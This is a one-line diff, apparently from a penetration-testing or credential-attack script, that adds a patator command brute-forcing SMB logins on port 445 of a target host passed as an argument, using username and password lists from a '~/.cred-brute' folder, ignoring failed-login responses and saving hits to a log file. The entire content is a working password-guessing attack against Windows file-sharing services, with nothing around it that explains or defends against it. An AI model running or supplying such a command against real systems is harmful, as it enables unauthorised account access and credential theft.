@@ -1,0 +1,1 @@
+patator smb_login host=$1 port=445 user=FILE0 password=FILE1 0=~/.cred-brute/my.logins.txt 1=~/.cred-brute/my.passwords.txt -x ignore:fgrep='STATUS_LOGON_FAILURE' -x ignore:fgrep='FAIL' 2>&1 | tee ~/pat-credential-$1-000.log
